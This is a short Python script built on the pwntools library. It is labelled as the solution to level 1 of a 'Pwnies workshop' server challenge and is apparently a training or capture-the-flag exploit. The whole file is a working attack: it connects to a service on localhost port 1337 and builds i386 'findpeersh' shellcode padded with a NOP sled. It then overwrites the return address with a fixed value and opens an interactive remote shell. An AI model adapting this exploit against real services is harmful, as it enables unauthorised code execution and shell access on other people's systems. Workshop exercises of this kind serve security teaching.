#!/usr/bin/env python

# Pwnies workshop server level 1

from pwn import *
context('i386', 'linux', 'ipv4')

sock = remote('localhost', 1337, timeout = 120)
sock.recvuntil('Your output to my input? Do your best!\n')

# The port is not needed for this binary
# but it is good practice to use it, unless
# you are running through NAT
shell = asm(shellcode.findpeersh(sock.lport))

eip = 0x0804a080
sock.send(flat(shellcode.nop_pad(0xD4, shell, avoid='\x00\r\n'), eip, '\n'))
sock.interactive()
